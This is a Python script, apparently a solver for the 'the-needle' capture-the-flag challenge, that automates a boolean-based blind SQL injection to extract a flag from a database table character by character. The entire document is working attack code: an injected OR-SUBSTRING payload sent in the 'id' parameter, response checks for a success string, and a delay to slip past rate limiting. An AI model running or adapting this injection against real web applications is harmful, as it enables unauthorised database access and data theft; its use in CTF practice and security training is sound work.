# This script automates the blind SQL injection attack described in the analysis.
# It extracts the 'information' field from the 'info' table, character by character.

import requests
import string
import sys
import time # Import the time module to add delays

def solve_sqli(url):
    """
    Performs a blind SQL injection attack to extract a flag from a vulnerable endpoint.

    Args:
        url (str): The full URL of the vulnerable page (e.g., http://example.com/index.php)
    """

    # --- Configuration ---
    # The set of characters to test for in the flag.
    # You can expand this if you expect other characters (e.g., uppercase, symbols).
    charset = string.ascii_lowercase + string.digits + "_-{}!@$" 
    
    # --- Initialization ---
    flag = ""
    position = 1
    
    print(f"[*] Starting blind SQL injection on {url}")
    print("[*] This may take a few moments...")

    # --- Main Loop ---
    # This loop will continue until we can't find any more characters,
    # which implies we've reached the end of the flag.
    while True:
        found_character_at_position = False
        
        # Iterate through every possible character for the current position.
        for char in charset:
            # --- Construct the Payload ---
            # This payload is designed to ask the database a true/false question.
            # It asks: "For the first user (WHERE id = 1), is the character at the current position equal to our test character?"
            # The '-- ' at the end is a SQL comment to safely ignore the rest of the original query string.
            payload = f"' OR (SELECT SUBSTRING(information, {position}, 1) FROM info WHERE id = 1) = '{char}' -- "
            
            params = {'id': payload}

            try:
                # Send the GET request with the malicious payload.
                response = requests.get(url, params=params)
                response.raise_for_status() # Raise an exception for bad status codes (4xx or 5xx)

                # --- MODIFICATION: Add a small delay ---
                # This helps to avoid overwhelming the server and triggering rate-limiting
                # defenses that might cause a 'Connection reset by peer' error.
                time.sleep(0.05) # 50 millisecond delay

                # --- Check the Response ---
                # The server's response tells us if our guess was correct.
                # If "Yes, We found it !!" is in the response, our injected condition was TRUE.
                if "Yes, We found it !!" in response.text:
                    flag += char
                    # Use sys.stdout to print on the same line for a cleaner output.
                    sys.stdout.write(f"\r[+] Flag found so far: {flag}")
                    sys.stdout.flush()
                    
                    position += 1
                    found_character_at_position = True
                    
                    # If we found the closing brace, we assume the flag is complete.
                    if char == '}':
                        print("\n[+] Closing brace found. Assuming end of flag.")
                        return flag
                        
                    break # Character found, move to the next position.

            except requests.exceptions.RequestException as e:
                print(f"\n[!] An error occurred during the request: {e}")
                print("[!] Please check the URL and your network connection.")
                return None

        # If we looped through the entire charset and found no matching character,
        # we assume we've reached the end of the flag.
        if not found_character_at_position:
            print("\n[*] No more characters found.")
            break
            
    return flag

if __name__ == "__main__":
    # --- IMPORTANT ---
    # Change this URL to the actual address of the vulnerable web page.
    target_url = "https://the-needle.chall.wwctf.com/" 
    
    final_flag = solve_sqli(target_url)
    
    if final_flag:
        print(f"\n[SUCCESS] The final extracted flag is: {final_flag}")
    else:
        print("\n[FAILURE] Could not extract the flag.")
